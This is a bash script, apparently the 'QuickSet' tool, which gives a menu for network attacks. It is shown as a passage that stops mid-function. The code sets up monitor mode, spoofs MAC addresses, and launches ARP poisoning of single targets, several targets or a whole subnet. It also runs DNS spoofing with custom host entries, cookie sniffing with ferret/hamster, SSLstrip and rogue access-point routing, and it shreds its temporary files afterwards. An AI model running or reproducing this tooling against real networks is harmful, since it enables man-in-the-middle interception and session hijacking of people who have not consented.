#!/bin/bash

##~~~~~~~~~~~~~~~~~~~~~~~~ BEGIN Repitious Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~##
usage--()
{
clear
echo -e "$ins\nUsage: ./quickset.sh"
}

init_setup--()
{
kill_mon=
clear
echo -e "$ins\n
----------------------------------------------------------------------
 Only Certain Modes in this Script Require Both Devices to be Defined
----------------------------------------------------------------------$hdr\n
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                          Initial NIC Setup
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Internet Connected NIC               [$out$ie$inp]

2) Monitor Mode NIC                     [$out$pii$inp]

3) Enable Monitor Mode

4) Kill Monitor Mode

5) MAC Address Options

6) List Available NICs

C)ontinue

E)xit Script$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
read init_var
case $init_var in
	1) echo -e "$inp\nDefine NIC" 
	read ie
	dev_check_var=$ie
	dev_check--
	if [[ $dev_check == "fail" ]];then
		ie=
	fi

	init_setup--;;

	2) echo -e "$inp\nDefine NIC" 
	read pii
	dev_check_var=$pii
	dev_check--
	if [[ $dev_check == "fail" ]];then
		pii=
	fi

	init_setup--;;

	3) monitormode--
	init_setup--
	;;

	4) kill_mon="kill"
	monitormode--
	init_setup--;;

	5) mac_control--;;

	6) nics--
	init_setup--;;

	c|C) main_menu--;;

	e|E) reset
	echo -e "\n\n"
	exit 0;;

	*) init_setup--;;
esac
}

monitormode--()
{
var=
km= ## Device to kill
clear
echo -e "$out"
airmon-ng
var_II=$(ifconfig -a | grep --color=never wlan | awk '{print $1}')
for var_II in $var_II; do
	echo -e "$out\n$var_II"
	ifconfig $var_II | grep --color=never wlan | awk '{print $5}' | cut -c1-17 | tr [:upper:] [:lower:] | sed 's/-/:/g'
done

var_II=$(ifconfig -a | grep --color=never mon | awk '{print $1}')
for var_II in $var_II; do
	echo -e "$out\n$var_II"
	ifconfig $var_II | grep --color=never mon | awk '{print $5}' | cut -c1-17 | tr [:upper:] [:lower:] | sed 's/-/:/g'
done

sleep 1
if [[ $kill_mon == "kill" ]];then
	echo -e "$wrn\n
                              ***WARNING***$ins
       Do not attempt to directly disable Monitor Mode on a Physical Device
        The script will ask for the associated Physical Device when ready$wrn
                              ***WARNING***"
	sleep 1
		echo -e "$inp\nMonitor Mode Device to Kill?"
		read km
		dev_check_var=$km
		dev_check--
		if [[ $dev_check == "fail" ]];then
			return
		fi

		if [[ -z $km ]];then
			return
		fi

	while [[ -z $var ]];do
		echo -e "$inp\nWhat Physical Device is $out$km$inp Associated With?"
		read var
		dev_check_var=$var
		dev_check--
		if [[ $dev_check == "fail" ]];then
			var=
		fi

	done

	echo -e "$out"
	airmon-ng stop $km && airmon-ng stop $var
	pii=
	echo -e "$ins\n\nPress Enter to Continue"
	read
else
	echo -e "$inp\nPhysical Device to Enable Monitor Mode on?"
	read phys_dev
	if [[ -z $phys_dev ]];then
		return
	fi

	dev_check_var=$phys_dev
	dev_check--
	if [[ $dev_check == "fail" ]];then
		return
	fi

	echo -e "$out"
	var=$(airmon-ng start $phys_dev | tee /tmp/airmon_output | grep enabled | awk '{print $5}' | sed 's/)//g')
	clear
	cat /tmp/airmon_output
	sleep 2.5
	shred -u /tmp/airmon_output
	pii=$var
fi
}

nics--()
{
clear
echo -e "$out"
airmon-ng
var=$(ifconfig -a | grep --color=never HWaddr | awk '{print $1}')
for var in $var; do
	echo -e "$out\n$var"
	ifconfig $var | grep --color=never HWaddr | awk '{print $5}' | cut -c1-17 | tr [:upper:] [:lower:] | sed 's/-/:/g'
done

echo -e "$ins\n\nPress Enter to Continue"
read
}

mac_control--()
{

	mac_control_II--()
	{
	mac_dev=
	mac_devII=
	rand=
	var_II=
	sam= ## Variable for SoftAP MAC address
	clear
	echo -e "$wrn\n
                              ***WARNING***$ins
       Do not attempt to directly change a Virtual Device (Monitor Mode NIC)
This script requires Physical and Virtual devices to have matching MAC Addresses$wrn
                              ***WARNING***\n\n\n\n\n\n"
	sleep 1
	echo -e "$inp\nNIC to Change?   (\033[1;32mLeave Blank to Return to Previous Menu$inp)"
	read mac_dev
	if [[ -z $mac_dev ]];then
		mac_control--
	else
		dev_check_var=$mac_dev
		dev_check--
		if [[ $dev_check == "fail" ]];then
			mac_control--
		fi

	fi

	while [[ -z $rand ]];do
		echo -e "$inp\nRandom MAC? (y or n)"
		read rand
		case $rand in
			y|Y) ;;

			n|N) while [[ -z $sam ]];do
				echo -e "$inp\nDesired MAC Address for $out$mac_dev$inp?   (\033[1;32mi.e. aa:bb:cc:dd:ee:ff$inp)"
				read sam
			done;;

			*) rand= ;;
		esac

	done

	while [[ $var_II != "x" ]];do
		echo -e "$inp\nDoes $out$mac_dev$inp have a Monitor Mode NIC associated with it? (y or n)"
		read var
		case $var in
			n|N|y|Y) var_II="x" ;;
			*) var_II= ;;
		esac

	done

	case $var in
		y|Y) case $rand in
			y|Y) while [[ -z $mac_devII ]];do
				echo -e "$inp\nMonitor Mode NIC name?"
				read mac_devII
				dev_check_var=$mac_devII
				dev_check--
				if [[ $dev_check == "fail" ]];then
					mac_devII=
				fi

			done

			ifconfig $mac_dev down
			ifconfig $mac_devII down
			clear
			echo -e "$out\n--------------------\nChanging MAC Address\n--------------------"
			echo -e "$out\n$mac_dev `macchanger -r $mac_dev`"
			if [[ $? -ne 0 ]];then
				echo -e "$wrn\nThe Attempt was Unsuccessful, Try Again"
				ifconfig $mac_dev up
				sleep .7
				mac_control--
			else
				rand_mac=$(ifconfig $mac_dev | awk '{print $5}')
				rand_mac=$(echo $rand_mac | awk '{print $1}')
				echo -e "$out\n$mac_devII `macchanger -m $rand_mac $mac_devII`"
				if [[ $? -ne 0 ]];then
					echo -e "$wrn\nThe Attempt was Unsuccessful, Try Again"
					ifconfig $mac_devII up
					sleep .7
					mac_control--
				else
					ifconfig $mac_dev up
					ifconfig $mac_devII up
					echo -e "$ins\n\n\n\nPress Enter to Continue"
					read
					mac_control--
				fi

			fi;;

			n|N) mac_devII=
			while [[ -z $mac_devII ]];do
				echo -e "$inp\nMonitor Mode NIC name?"
				read mac_devII
				dev_check_var=$mac_devII
				dev_check--
				if [[ $dev_check == "fail" ]];then
					mac_devII=
				fi

			done

			ifconfig $mac_dev down
			ifconfig $mac_devII down
			clear
			echo -e "$out\n--------------------\nChanging MAC Address\n--------------------"
			echo -e "$out\n$mac_dev `macchanger -m $sam $mac_dev`"
			if [[ $? -ne 0 ]];then
				echo -e "$wrn\nThe Attempt was Unsuccessful, Try Again"
				ifconfig $mac_dev up
				sleep .7
				mac_control--
			else
				echo -e "$out\n$mac_devII `macchanger -m $sam $mac_devII`"
				if [[ $? -ne 0 ]];then
					echo -e "$wrn\nThe Attempt was Unsuccessful, Try Again"
					ifconfig $mac_devII up
					sleep .7
					mac_control--
				else
					ifconfig $mac_dev up
					ifconfig $mac_devII up
					echo -e "$ins\n\n\n\nPress Enter to Continue"
					read
					mac_control--
				fi

			fi;;

		esac;;

		n|N) case $rand in
			y|Y) ifconfig $mac_dev down
			clear
			echo -e "$out\n--------------------\nChanging MAC Address\n--------------------"
			echo -e "$out\n$mac_dev `macchanger -r $mac_dev`"
			if [[ $? -ne 0 ]];then
				echo -e "$wrn\nThe Attempt was Unsuccessful, Try Again"
				ifconfig $mac_dev up
				sleep .7
				mac_control--
			else
				ifconfig $mac_dev up
				echo -e "$ins\n\n\n\nPress Enter to Continue"
				read
				mac_control--
			fi;;

			n|N) ifconfig $mac_dev down
			clear
			echo -e "$out\n--------------------\nChanging MAC Address\n--------------------"
			echo -e "$out\n$mac_dev `macchanger -m $sam $mac_dev`"
			if [[ $? -ne 0 ]];then
				echo -e "$wrn\nThe Attempt was Unsuccessful, Try Again"
				ifconfig $mac_dev up
				sleep .7
				mac_control--
			else
				ifconfig $mac_dev up
				echo -e "$ins\n\n\n\nPress Enter to Continue"
				read
				mac_control--
			fi;;

		esac;;

	esac
	}

clear
echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      --MAC Address Options--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) List Available NICs

2) MAC Address Change

P)revious Menu

G)oto Main Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
read var
case $var in
	1) nics--
	mac_control--;;

	2) mac_control_II--;;

	p|P) case $init_var in
		6) init_setup--;;
		*) init_var=
		setups--;;
	esac;;

	g|G) main_menu--;;

	*) mac_control--;;
esac
}

dev_check--()
{
ifconfig $dev_check_var > /dev/null
if [[ $? -ne 0 ]];then
	clear
	echo -e "$wrn\nDevice does NOT exist"
	sleep 1
	dev_check="fail"
else		for (( i = 1 ; i < 5 ; i++ ));do
			column=$(echo $var | cut -d . -f$i)
			if [[ $column -lt 0 || $column -gt 255 ]];then
				ip_mac="fail"
				break
			else
				ip_mac=
			fi

		done

		clear
	dev_check=
fi
}

trap--()
{
echo -e "$wrn\nPlease Exit Out of The Script Properly"
sleep 2
main_menu--
}

no_dev--()
{
case $1 in
	monitor) 
	clear
	echo -e "$out\nMonitor Mode NIC not defined\n$inp\nWould You Like to Define it Now? (y or n)"
	read no_dev
	case $no_dev in
		y|Y) 
		echo -e "$inp\nMonitor Mode NIC?"
		read pii
		dev_check_var=$pii
		dev_check--
		case $dev_parent in
			venue--)
			if [[ $dev_check == "fail" ]];then
				pii=
				var=
			fi

			sm=$(ifconfig $pii | grep --color=never HWaddr | awk '{print $5}' | cut -c1-17 | tr [:upper:] [:lower:] | sed 's/-/:/g');;

			routing--)
			if [[ $dev_check == "fail" ]];then
				pii=
				rte_choice=
			fi;;

		esac;;

		*) 
		case $dev_parent in
			venue--) 
			var= ;;

			routing--) 
			rte_choice= ;;
		esac;;

	esac;;

	managed)
	clear
	echo -e "$out\nInternet Connected NIC not defined\n$inp\nWould You Like to Define it Now? (y or n)"
	read no_dev
	case $no_dev in
		y|Y) 
		echo -e "$inp\nInternet Connected NIC?"
		read ie
		dev_check_var=$ie
		dev_check--
		case $dev_parent in
			routing--)
			if [[ $dev_check == "fail" ]];then
				ie=
				rte_choice=
			fi;;

		esac;;

		*) 
		case $dev_parent in
			routing--) 
			rte_choice= ;;
		esac;;

	esac;;

esac }


fcheck--()
{
for_check=$(cat /proc/sys/net/ipv4/ip_forward)
	if [[ $for_check == 0 ]];then
		clear
		echo -e "$out\nKernel Forwarding is Not Enabled\n$inp\nMake it So? (y or n)"
		read k_for_check
		case $k_for_check in
			y|Y)
			echo "1" > /proc/sys/net/ipv4/ip_forward ;;
		esac
	fi
}

ip_mac--()
{

##ipv4
#=`echo $input | awk -F. '{ if ( NF != 4 || length($0) > 15 || length ($0) < 7 || length($1) > 3 || length($2) > 3 || length($3) > 3 || length($4) > 3 ) print "FAIL" }'` 

#ipv6
#=`echo $input | awk -F: '{ if ( NF != 8 || length($0) > 39 || length ($0) < 15 || length($1) > 4 || length($2) > 4 || length($3) > 4 || length($4) > 4 || length($5) > 4 || length($6) > 4 || length($7) > 4 || length($8) > 4 ) print "FAIL" }'` 

##MAC
#=`echo $input | awk -F: '{ if ( NF != 6 || length($0) > 17 || length ($0) < 11 || length($1) > 2 || length($2) > 2 || length($3) > 2 || length($4) > 2 || length($5) > 2 || length($6) > 2 ) print "FAIL" }'` 

case $1 in
	ip) var=$2
	echo $var | grep -v [^0-9.]
	if [ $? -ne 0 ];then
		ip_mac="fail"
	else
		for (( i = 1 ; i < 5 ; i++ ));do
			column=$(echo $var | cut -d . -f$i)
			if [[ $column -lt 0 || $column -gt 255 ]];then
				ip_mac="fail"
				break
			else
				ip_mac=
			fi

		done

		clear
		ip_mac=
	fi

	if [[ $ip_mac == "fail" ]];then
		echo -e "$wrn\nIP Address is not Valid"
		sleep 1
	fi;;

# 	mac) var=$2
# 	echo $var | grep -iv [^g-z:]
# 	if [ $? -ne 0 ];then
# 		ip_mac="fail"
# 	else
# 		ip_mac=
# 	fi
# 
# 	if [[ -z $ip_mac ]];then
# 		for (( i = 1 ; i < 5 ; i++ ));do
# 			column=$(echo $var | cut -d . -f$i)
# 			if [[ $column -lt 0 || $column -gt 255 ]];then
# 				ip_mac="fail"
# 				break
# 			else
# 				ip_mac=
# 			fi
# 
# 		done
# 
# 	clear
# 	fi
# 
# 	if [[ $ip_mac == "fail" ]];then
# 		echo -e "$wrn\nMAC Address is not Valid"
# 		sleep 1
# 	fi;;
esac
}

tchan--()
{
#tc= ## tgt channel
echo -e "$inp\nTgt Channel? (1-14)"
read tc
case $tc in
	1|2|3|4|5|6|7|8|9|10|11|12|13|14) ;;

	*) tc=
	echo -e "$wrn\nYou Must Enter a Legitimate Channel to Proceed"
	sleep 1.5
	clear;;
esac

case $parent_IV in
	dump) dump--;;
esac

case $parent_III in
	rtech) parent_III= ## Nulled to prevent repeat looping that is NOT wanted!
	rtech_II--;;
esac

case $parent_VI in
	ctech) ctech_II--;;
esac
}

chan_check--()
{
chan_res=$(iwlist $1 channel | grep Current | awk '{print $5}' | sed 's/)//')
if [[ -z $chan_res ]];then
	clear
	echo -e "$out\nCurrent Channel for $1 is not Set"
fi
}
##~~~~~~~~~~~~~~~~~~~~~~~~~ END Repitious Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~~~~~~~~~~~ BEGIN Starting Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~##
envir--()
{
wrn="\033[31m"   ## Warnings / Infinite Loops
ins="\033[1;32m" ## Instructions
out="\033[1;33m" ## Outputs
hdr="\033[1;34m" ## Headers
inp="\033[36m"   ## Inputs
}

greet--()
{
clear
echo -e "$hdr\n\n\n\n\n\n\n
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 QuickSet - A Quick Way to Setup a Wired/Wireless Hack
       Author: stryngs ----> \033[1;33minfo [at] ethicalreporting.org$ins
           Read Comments Prior to Usage$hdr

             Version $out$current_ver$hdr (\033[1;33m$rel_date$hdr)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
sleep 2.5
ap_check=
init_setup--
}

main_menu--()
{
trap trap-- INT
clear
echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~
    QuickSet (\033[1;33m$current_ver$hdr)
     --Main Menu--
Make Your Selection Below
~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Setup Menu

2) WiFi Stuff

3) Quick Attacks

4) Routing Features

E)xit Script$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
read var
case $var in
	1) setups--;;

	2) wifi_101--;;

	3) atk_menu--;;

	4) routing--;;

	e|E) cleanup--;;

	*) main_menu--;;
esac
}
##~~~~~~~~~~~~~~~~~~~~~~~~~~ END Starting Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~~~~~~~~ BEGIN main_menu-- functions ~~~~~~~~~~~~~~~~~~~~~~~~~~##
setups--()
{
clear
echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
         --Setup Menu--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) List Available NICs

2) NIC Names & Monitor Mode Setup

3) MAC Address Options

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
read var
case $var in
	1) nics--
	setups--;;

	2) naming--;;

	3) mac_control--;;

	m|M) main_menu--;;

	*) setups--;;
esac
}

## wifi_101-- is at the bottom of this script due to length

atk_menu--()
{
clear
echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                  --Attack Menu--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Arpspoof

2) DNSspoof

3) Ferret

4) Hamster

5) SSLstrip

M)ain Menu
$ins
--> All Attacks launched in `pwd`$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
read var
case $var in
	1) arpspoof--;;

	2) dnsspoof--;;

	3) ferret--;;

	4) if [[ -f hamster.txt ]];then
		Eterm -b black -f white --pause --title "Hamster" -e hamster &
		atk_menu--
	else
		echo -e "$wrn\n\nhamster.txt MUST exist to run hamster"
		sleep 1.5
		atk_menu--
	fi;;

	5) strip_em--;;

	m|M) main_menu--;;

	*) atk_menu--;;
esac
}

routing--()
{
## The order of functions are for 2, 3 and 4 are: ap_pre_var--(), ap_setup--(), ap--()
## The order of functions for the DHCP server is: dhcp_pre_var--(), dhcp_svr--()
#rte_choice= Routing Option Variable for use with IPTABLES setups...
#k_for_check= Variable to determine if the user would liek to enable Kernel Forwarding
private= ## Wifi Range Extender trip variable
clear
echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~
    --Routing Features--
~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) IPTABLES Configuration

2) Kernel Forwarding

3) Wireless Vaccuum

4) StickyPot

5) WiFi Range Extender

6) DHCP Server

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
read rte_choice
case $rte_choice in
	3|5) dev_parent="routing--"
	if [[ -z $pii ]];then
		no_dev-- monitor
	fi

	if [[ -z $ie ]];then
		no_dev-- managed
	fi

	case $rte_choice in
		3) ap_type=3 ;;
		5) ap_type=5 ;;
	esac

	fcheck--;;

	4) dev_parent="routing--"
	if [[ -z $pii ]];then
		no_dev-- monitor
	fi

	ap_type=4;;
esac

case $rte_choice in
	1) ipt_--;;

	2) k_for--;;

	3) ap_pre_var--
	ap_setup--;;

	4) ap_pre_var--
	ap_setup--;;

	5) private="yes"
	ap_pre_var--
	ap_setup--;;

	6) dhcp_pre_var--
	if [[ $ap_check != "on" ]]; then
		ap_pre_var--
	fi

	dhcp_svr--;;

	m|M) main_menu--;;

	*) routing--;;
esac
}

cleanup--()
{
## Check for DHCPD action history
## If it existed, act appropriately
if [[ -n $dhcp_svr_pid ]];then
	ps aux | grep $dhcp_svr_pid | grep -v grep > /dev/null 2>&1
	if [[ $? -eq 0 ]];then
		echo -e "$inp\nKill the DHCP Server? (y or n)"
		read var
		case $var in
			y|Y) kill -9 $dhcp_svr_pid
			echo -e "$out\nDHCP Server Successfully Killed" ;;
		esac

	fi

	test -f /tmp/dhcpd/dhcpd.pid
	if [[ $? -eq 0 ]];then
		echo -e "$inp\nRemove the DHCP Server PID file? (y or n)"
		read var
		case $var in
			y|Y) echo -e "$out"
			shred -uv /tmp/dhcpd/dhcpd.pid ;;
		esac

	fi

	test -f /tmp/dhcpd/dhcpd.leases
	if [[ $? -eq 0 ]];then
		echo -e "$inp\nRemove /tmp/dhcpd/dhcpd.leases? (y/n)"
		read var
		case $var in
			y|Y) echo -e "$out"
			shred -uv /tmp/dhcpd/dhcpd.leases ;;
		esac

	fi

	test $dhcpdconf
	if [[ $? -eq 0 ]];then
		echo -e "$inp\nRemove $dhcpdconf? (y/n)"
		read var
		case $var in
			y|Y) echo -e "$out"
			shred -uv $dhcpdconf ;;
		esac

	fi

fi

## Check for DNS Spoofing history
## If it existed, act appropriately
if [[ $dns_tmp == 1 ]];then
	var=0
	while [[ $var == 0 ]];do
		echo -e "$inp\nRemove /tmp/dns_spf? (y/n)"
		read var
		case $var in
			y|Y) shred -uv /tmp/dns_spf
			var=1 ;;

			n|N) var=1 ;;

			*) ;;
		esac

	done

fi

if [[ $wacg_check == "active" ]];then
var=0
	while [[ $var == 0 ]];do
		echo -e "$inp\nRemove temporary WACg Files? (y/n) $out{/tmp/WACg/*}"
		read var
		case $var in
			y|Y) shred -uv /tmp/WACg/*
			rm -rf /tmp/WACg
			var=1 ;;

			n|N) var=1 ;;

			*) ;;
		esac

	done

fi

reset
echo -e "\n\n\n"
exit
}
##~~~~~~~~~~~~~~~~~~~~~~~~ END main_menu-- functions ~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~ BEGIN setups-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~~~##
naming--()
{
clear
echo -e "$wrn\n
                        ***WARNING***$ins
Proceeding further will erase all NIC variable names for this script
Doing so requires that you rename them for this script to work properly$wrn
                        ***WARNING***
          
$inp\nDo you wish to continue? (y) or (n)\n"
read var
case $var in
	y|Y) ie=
	pii=
	init_setup--;;
	
	n|N) setups--;;

	*) naming--;;
esac
}
##~~~~~~~~~~~~~~~~~~~~~~~~~ END setups-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~~~~~~~~~ BEGIN atk_menu-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~##
arpspoof--()
{

	mass_arp--()
	{
	if [[ $arp_way == "yes" ]];then
		while [[ "$1" != "" ]];do
			Eterm -b black -f white --pause --title "ARP to $1 as $gt_way (GW)" -e arpspoof -i $spoof_dev -t $1 $gt_way &
			Eterm -b black -f white --pause --title "ARP to $gt_way (GW) as $1" -e arpspoof -i $spoof_dev -t $gt_way $1 &
			shift
		done

	else
		while [[ "$1" != "" ]];do
			Eterm -b black -f white --pause --title "ARP to $1 as $gt_way (GW)" -e arpspoof -i $spoof_dev -t $1 $gt_way &
			shift 
		done

	fi
	}

	arpspoof_II--()
	{
	clear

	echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
          --ARPspoof Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Spoofing NIC        [$out$spoof_dev$inp]

2) Gateway IP Address  [$out$gt_way$inp]

3) Target              [$out$tgt_style_II$inp]

4) List Available NICs

C)ontinue

P)revious Menu

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
	read var
	case $var in
		1) echo -e "$inp\nNIC?"
			read spoof_dev
			dev_check_var=$spoof_dev
			dev_check--
			if [[ $dev_check == "fail" ]];then
				spoof_dev=
			fi

			arpspoof_II--;;

		2) echo -e "$inp\nDefine Gateway IP Address (Who Are We Pretending to Be?)"
		read gt_way
		ip_mac-- ip $gt_way
		if [[ $ip_mac == "fail" ]];then
			gt_way=
		fi

		arpspoof_II--;;

		3) echo -e "$hdr\n~~~~~~~~~~~~~~~~~
--ArpSpoof Tgts--
~~~~~~~~~~~~~~~~~$inp
E)verybody 
M)ultiple Tgts
S)ingle Tgt$hdr
~~~~~~~~~~~~~~~~~\n$inp"
		read tgt_style
		case $tgt_style in
			e|E) tgt_style_II="Everybody";;

			m|M) echo -e "$inp\nSeperate Tgts with a space (i.e. IP1 IP2 IP3)"
			read mult_tgts
			while [[ $var_II != "x" ]];do
				echo -e "$inp\nTwo Way Spoof? (y or n)"
				read _2way
				case $_2way in
					y|Y) var_II="x" 
					arp_way="yes";;

					n|N) var_II="x";;

					*) var_II= ;;
				esac

			done

			tgt_style_II="Multiple Tgts";;

			s|S) echo -e "$inp\nDefine Target IP address (Who Are we Lying to?)"
			read tgt_ip
			ip_mac-- ip $tgt_ip
			if [[ $ip_mac == "fail" ]];then
				tgt_ip=
			fi

			if [[ -z $tgt_ip ]];then
				arpspoof_II
			else
				while [[ $var_III != "x" ]]; do
					echo -e "$inp\nTwo Way Spoof? (y or n)"
					read _2way
					case $_2way in 
						y|Y|n|N) var_III="x";;

						*) var_III= ;;
					esac

				done

			tgt_style_II="Single Tgt"
			fi;;

			*) tgt_style_II= ;;
		esac

		arpspoof_II--;;

		4) nics--
		arpspoof_II--;;

		c|C) if [[ -z $spoof_dev || -z $gt_way || -z $tgt_style_II ]];then
			echo -e "$wrn\nAll Fields Must be Filled Before Proceeding"
			sleep 1
			arpspoof_II--
		else
			fcheck--
			case $tgt_style in
				e|E) Eterm -b black -f white --pause --title "ArpSpoof Subnet $gt_way (GW)" -e arpspoof -i $spoof_dev $gt_way &
				atk_menu--;;

				m|M) mass_arp-- $mult_tgts
				atk_menu--;;

				s|S) case $_2way in 
					y|Y) Eterm -b black -f white --pause --title "ARP to $tgt_ip as $gt_way (GW)" -e arpspoof -i $spoof_dev -t $tgt_ip $gt_way &
					Eterm -b black -f white --pause --title "ARP to $gt_way (GW) as $tgt_ip" -e arpspoof -i $spoof_dev -t $gt_way $tgt_ip & ;;

					n|N) Eterm -b black -f white --pause --title "ARP to $tgt_ip as $gt_way (GW)" -e arpspoof -i $spoof_dev -t $tgt_ip $gt_way & ;;
				esac

				atk_menu--;;

			esac

		fi;;

		p|P) atk_menu--;;

		m|M) main_menu--;;

		*) arpspoof_II--;;
	esac
	}

var_II=
var_III=
spoof_dev=$ie ## Device to spoof with
gt_way=$(route -en | grep UG | awk '{print $2}' | head -n1) ## Gateway IP variable, defaulted to first gateway if available
tgt_ip= ## Tgt IP variable
mult_tgts= ## Variable to assign multiple IPs with
arp_way= ## Variable to define Two-Way spoofing with multiple IPs
tgt_style_II= ## Variable for showing who is being targeted, $tgt_style defines who is being targeted 
arpspoof_II--
}

dnsspoof--()
{
#dspoof_dev= Device to listen on
#d_hosts= Variable to check if user wants to use custom hosts file for dnsspoof

	dnsspoof_II--()
	{
	#dns_spf_array= Array for holding the custom DNS spoof inputs
	#dns_spf_entry= Variable for index assignments within ${dns_spf_array[@]}
	#dns_spf_total= Total number of indexes in the DNS Spoof array
	clear
	echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
           --DNSspoof Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Listening NIC    [$out$dspoof_dev$inp]

2) Custom Hostfile  [\033[1;33m$d_hosts\033[36m]

2) List Available NICs

C)ontinue

P)revious Menu

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
	read var
	case $var in
		1) echo -e "$inp\nNIC?"
		read dspoof_dev
		dev_check_var=$dspoof_dev
		dev_check--
		if [[ $dev_check == "fail" ]];then
			dspoof_dev=
		fi
	
		dnsspoof_II--;;

		2) echo -e "\033[36m\nUse Custom DNS Hosts File? (y or n)$inp"
		read d_hosts
		case $d_hosts in
			y|Y) d_hosts="Yes"
			shred -u /tmp/dns_spf > /dev/null 2>&1
			unset dns_spf_array
			declare -a dns_spf_array
			echo -e "$ins\nEnter each line of desired dnsspoof hostsfile\n(i.e. 192.168.1.1 foo.com).\nEnd with # on a new line.\n$inp"
			while :;do
				read dns_spf_entry
				if [[ $dns_spf_entry != \# ]];then
					dns_spf_array=("${dns_spf_array[@]}" "$dns_spf_entry")
				else
					break
				fi

			done

			dns_spf_total=$(echo ${#dns_spf_array[@]})
			for (( i = 0 ; i < $dns_spf_total ; i++ ));do ## $i is a simple counter
				echo ${dns_spf_array[$i]} >> /tmp/dns_spf
			done

			dns_tmp=1 ;; ## Variable for determining if /tmp/dns_spf has been created

			n|N) d_hosts="No" ;;

			*) d_hosts= ;;
		esac

		dnsspoof_II--;;

		3) nics--
		ferret_II--;;

		c|C) if [[ -z $dspoof_dev || -z $d_hosts ]];then
			echo -e "$wrn\nAll Fields Must be Filled Before Proceeding"
			sleep 1
			dnsspoof_II--
		else
			fcheck--
			case $d_hosts in
				Yes) Eterm -b black -f white --pause --title "DNSspoof" -e dnsspoof -i $dspoof_dev -f /tmp/dns_spf & 
				atk_menu--;;

				No) Eterm -b black -f white --pause --title "DNSspoof" -e dnsspoof -i $dspoof_dev & 
				atk_menu--;;
			esac

		fi;;

		p|P) atk_menu--;;

		m|M) main_menu--;;

		*) ferret_II--;;
	esac
	}

dspoof_dev=$ie
d_hosts="No"
dnsspoof_II--
}

ferret--()
{
#fer_dev= Device to be sniffed
#fer_type= Wifi or Wired
#wifi_check= Allowing us the conditional choice for a non default ferret setting of channel 6 if we use a wifi device

	ferret_II--()
	{
	clear
	echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
           --Ferret Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Device to Sniff  [$out$fer_dev$inp]

2) Type of Device   [$out$fer_type$inp]

3) List Available NICs

C)ontinue

P)revious Menu

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
	read var
	case $var in
		1) echo -e "$inp\nDevice?"
		read fer_dev
		dev_check_var=$fer_dev
		dev_check--
		if [[ $dev_check == "fail" ]];then
			fer_dev=
		fi

		ferret_II--;;

		2) echo -e "$inp\n1) Wireless\n2) Wired"
		read var
		case $var in
			1) fer_type="Wireless"
			wifi_check="wireless" ;;

			2) fer_type="Wired"
			wifi_check="wired" ;;

			*) var= ;;
		esac

		ferret_II--;;

		3) nics--
		ferret_II--;;

		c|C) if [[ -z $fer_dev || -z $wifi_check ]];then
			echo -e "$wrn\nSniffing Device and Type Must be Selected to Proceed"
			sleep 1
			ferret_II--
		else
			case $wifi_check in
				wireless) var=
					chan_check-- $fer_dev
					if [[ -n $chan_res ]];then
						echo -e "$out\nCurrent Channel is: $chan_res. $inp Would You Like to Change it? (y/n)"
						read var
					else
						tchan--
					fi

					case $var in
						y|Y) tchan--;;
